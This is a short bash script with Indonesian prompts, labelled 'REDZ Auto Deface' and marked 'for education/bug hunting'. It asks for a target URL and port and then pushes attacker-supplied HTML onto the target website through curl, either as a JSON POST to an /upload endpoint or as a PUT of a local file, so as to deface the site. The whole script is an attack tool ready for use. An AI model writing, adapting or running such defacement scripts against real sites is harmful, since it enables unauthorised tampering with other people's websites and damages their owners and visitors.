#!/bin/bash

# REDZ AUTO DEFACE V1 - ONLY FOR EDUCATION/BUG HUNTING
# By krnlREDZ 🧠⚔️

clear
echo "=== REDZ Auto Deface V3 ==="

read -p "🔗 Masukkan link target (cth: http://target.com): " target
read -p "📍 Masukkan port (cth: 80): " port

# Tambahkan port ke URL kalau bukan 80
if [[ "$port" != "80" ]]; then
    target="$target:$port"
fi

echo ""
echo "📂 Pilih metode deface:"
echo "1) JSO (kode langsung)"
echo "2) File (HTML lokal)"
read -p "Masukkan pilihan (1/2): " mode

if [[ "$mode" == "1" ]]; then
    read -p "📝 Masukkan nama file output (contoh: redz.html): " fname
    read -p "✏️ Masukkan kode HTML deface kamu (1 baris HTML): " kode

    json_payload=$(cat <<EOF
{
  "filename": "$fname",
  "content": "$kode",
  "content_type": "text/html"
}
EOF
)
    echo "[*] Mengirim payload JSON ke $target ..."
    curl -X POST "$target/upload" \
        -H "Content-Type: application/json" \
        -d "$json_payload"
    echo "[✔] Coba cek di: $target/$fname"

elif [[ "$mode" == "2" ]]; then
    read -p "📄 Masukkan nama file HTML (yang ada di folder ini): " file
    if [ ! -f "$file" ]; then
        echo "[!] File tidak ditemukan!"
        exit 1
    fi

    echo "[*] Mengupload file ke $target ..."
    curl -T "$file" "$target/$file"
    echo "[✔] Coba cek di: $target/$file"

else
    echo "[!] Pilihan tidak valid!"
    exit 1
fi
